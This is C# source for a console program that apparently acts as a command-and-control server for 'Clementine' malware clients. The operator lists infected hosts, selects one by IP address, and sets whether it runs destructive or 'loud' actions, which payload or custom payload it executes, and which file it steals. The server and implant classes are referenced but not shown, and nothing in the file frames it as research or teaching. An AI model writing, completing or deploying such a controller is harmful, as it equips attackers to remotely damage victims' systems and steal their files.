using System;
using System.Net;

namespace ClementineBasicServer
{
    public class Program
    {
        private const string SET_STATUS = "setstatus";
        private const string LIST = "list";
        private const string TALK = "talk ";
        private const string DONE = "done";

        public static void Main()
        {
            var server = new ClementineServer();
            var target = IPAddress.None;
            server.Start();

            Console.WriteLine("Now listening for incoming Clementine connections... Please input command");

            while (true)
            {
                Console.WriteLine();
                Console.Write("Enter command: ");
                var command = Console.ReadLine().ToLower();
                if (command.Equals(SET_STATUS))
                {
                    if (target == IPAddress.None)
                    {
                        Console.WriteLine("No target set.  Please try again.");
                        continue;
                    }
                    bool done, destructive, loud;
                    byte requested;
                    int toParse;
                    string requestedPayload, stealFile;
                    var status = server.GetStatus(target);
                    if (status == null)
                    {
                        Console.WriteLine("Clementine Client not found - set in advance? (y/N)");
                        if (!Console.ReadLine().Trim().Equals("y"))
                        {
                            continue;
                        }
                    }

                    Console.WriteLine("Done? (y/N)");
                    done = Console.ReadLine().Trim().ToLower().Equals("y");
                    Console.WriteLine("Destructive? (y/N)");
                    destructive = Console.ReadLine().Trim().ToLower().Equals("y");
                    Console.WriteLine("Loud? (Y/n)");
                    loud = !Console.ReadLine().Trim().ToLower().Equals("n");
                    Console.WriteLine("Payload?");
                    requested = int.TryParse(Console.ReadLine().Trim(), out toParse) ? (byte)toParse : ClementineConnection.NO_PAYLOAD_NETWORK;
                    Console.WriteLine("Custom Payload?");
                    requestedPayload = Console.ReadLine().Trim();
                    Console.WriteLine("Steal File?");
                    stealFile = Console.ReadLine().Trim();
                    status.SetAll(destructive, loud, done, requested, requestedPayload, stealFile);
                    Console.WriteLine("Set");
                }
                else if (command.StartsWith(TALK))
                {
                    var input = command.Substring(TALK.Length);
                    var result = IPAddress.TryParse(input, out target);
                    if (result)
                    {
                        Console.WriteLine("Target set to " + target.ToString());
                        if (server.GetStatus(target) == null)
                        {
                            Console.WriteLine("Warning: No such clementine client is known to exist");
                        }
                    }
                    else
                    {
                        Console.WriteLine("Illegal target");
                    }

                }
                else if (command.Equals(LIST))
                {
                    var clients = server.GetKnownClients();
                    Console.WriteLine("Known Clients:");
                    foreach (var client in clients)
                    {
                        Console.WriteLine(client.ToString());
                    }
                }
                else if (command.Equals(DONE))
                {
                    Console.WriteLine("Exiting");
                    server.Stop();
                    break;
                }
                else
                {
                    Console.WriteLine("Illegal Command");
                }
            }
        }
    }
}
